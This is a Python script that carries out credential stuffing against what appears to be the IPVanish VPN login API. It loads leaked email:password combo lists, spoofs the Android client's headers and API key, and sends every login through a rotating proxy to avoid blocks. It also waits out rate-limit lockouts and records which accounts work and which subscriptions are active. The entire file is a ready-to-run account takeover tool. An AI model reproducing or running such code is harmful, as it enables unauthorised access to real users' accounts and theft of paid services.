import requests
import json
import time

# ZenRows proxy configuration

# add your data from https://app.zenrows.com/proxies/generator
proxy = "http://**********:**********@superproxy.zenrows.com:1337"
proxies = {
    'http': proxy,
    'https': proxy
}

# Common request data
url = "https://trutri.org/api/v3/login"
api_key = "15cb936e6d19cd7db1d6f94b96017541"
client = "Android-3.4.6.7.98607b98607"
os_version = "22"
uuid = "15074a7e-ce75-4d91-b876-7c45dc5d040a"
headers = {
    "Host": "trutri.org",
    "user-agent": "Android/ipvanish/1.2.",
    "x-client": "ipvanish",
    "x-client-version": "1.2.",
    "x-platform": "Android",
    "x-platform-version": "22",
    "accept-encoding": "gzip",
    "Content-Type": "application/json"
}

# Read credentials from the file with UTF-8 encoding

# create credentials.txt and add your user@gmail.com:passwords combos

try:
    with open("credentials.txt", "r", encoding="utf-8") as file:
        credentials = [line.strip().split(":") for line in file if ":" in line]
except FileNotFoundError:
    print("Error: The 'credentials.txt' file was not found.")
    exit()
except UnicodeDecodeError as e:
    print(f"Encoding error when reading the file: {e}")
    exit()

# Load failed users from the file
try:
    with open("failed.txt", "r", encoding="utf-8") as file:
        failed_users = set(line.strip() for line in file)
except FileNotFoundError:
    failed_users = set()

# Test the proxy before making requests
test_url = "https://httpbin.org/ip"
print("Testing the proxy...")
try:
    test_response = requests.get(test_url, proxies=proxies, verify=True)
    if test_response.status_code == 200:
        print("Proxy is working correctly:", test_response.json())
    else:
        print(f"Error in proxy test: {test_response.status_code}")
        exit()
except requests.exceptions.RequestException as e:
    print(f"Error testing the proxy: {e}")
    exit()

# Variables to store results
results = {
    "successful": [],
    "expired": [],
    "failed": []
}

# Function to save failed users with their password
def save_failed(failed_users):
    with open("failed.txt", "w", encoding="utf-8") as file:
        for failed in failed_users:
            file.write(f"{failed}\n")

# Process each credential
for username, password in credentials:
    # Check if the user has failed previously
    if f"{username}:{password}" in failed_users:
        print(f"User {username} has previously failed, skipping.")
        continue

    print(f"\nLogging in with user: {username}")

    payload = {
        "api_key": api_key,
        "client": client,
        "os": os_version,
        "password": password,
        "username": username,
        "uuid": uuid
    }

    # Login attempts (max 3)
    attempt = 0
    success = False

    while attempt < 3 and not success:
        try:
            response = requests.post(url, data=json.dumps(payload), headers=headers, proxies=proxies, verify=True)
            
            if response.status_code == 200:
                data = response.json()

                # KEYCHECK: check for "incorrect" or "refresh_token"
                if "incorrect" in data:
                    print("Login failed: incorrect username or password.")
                    results["failed"].append(username)
                    failed_users.add(f"{username}:{password}")  # Save the failed user and password
                    save_failed(failed_users)  # Save the file immediately
                    success = True  # End the attempt
                elif "refresh_token" in data:
                    print("Login successful.")
                    # PARSE "account_type"
                    account_type = data.get("account_type", "Unknown")
                    # PARSE "sub_end_epoch"
                    expires_unix = data.get("sub_end_epoch", 0)
                    current_unix = int(time.time())

                    if expires_unix < current_unix:
                        print("The subscription has expired.")
                        results["expired"].append(username)
                    else:
                        renewal_date = time.strftime('%Y-%m-%d %H:%M:%S', time.gmtime(expires_unix))
                        print(f"Renewal date: {renewal_date}")
                        results["successful"].append({
                            "username": username,
                            "account_type": account_type,
                            "renewal_date": renewal_date
                        })
                    success = True  # End the attempt

                else:
                    print("Unexpected response:", data)
                    success = True  # End the attempt

            elif response.status_code == 403 and "Too many failed attempts" in response.text:
                print(f"Error: Too many failed attempts for user {username}. Waiting 15 seconds before retrying...")
                attempt += 1
                if attempt < 10:
                    time.sleep(15)  # Wait 15 seconds before retrying
                else:
                    print(f"10 failed attempts reached for user {username}. Moving to the next user.")
                    failed_users.add(f"{username}:{password}")  # Save the failed user and password
                    save_failed(failed_users)  # Save the file immediately
                    success = True  # End the cycle for this user if 3 failed attempts are reached

            else:
                print(f"Request error: {response.status_code}")
                print(f"Response details: {response.text}")
                results["failed"].append(username)
                failed_users.add(f"{username}:{password}")  # Save the failed user and password
                save_failed(failed_users)  # Save the file immediately
                success = True  # End the attempt

        except requests.exceptions.RequestException as e:
            print(f"Error connecting with user {username}: {e}")
            results["failed"].append(username)
            failed_users.add(f"{username}:{password}")  # Save the failed user and password
            save_failed(failed_users)  # Save the file immediately
            success = True  # End the attempt if an error occurs

# Save the results to a file
with open("results.txt", "w") as file:
    file.write("=== Script Results ===\n\n")

    file.write("Users with successful login and active subscription:\n")
    for successful in results["successful"]:
        file.write(f"- {successful['username']}, Account Type: {successful['account_type']}, Renewal: {successful['renewal_date']}\n")

    file.write("\nUsers with successful login but expired subscription:\n")
    for expired in results["expired"]:
        file.write(f"- {expired}\n")

    file.write("\nUsers with failed login:\n")
    for failed in results["failed"]:
        file.write(f"- {failed}\n")

print("\nResults saved in 'results.txt'.")
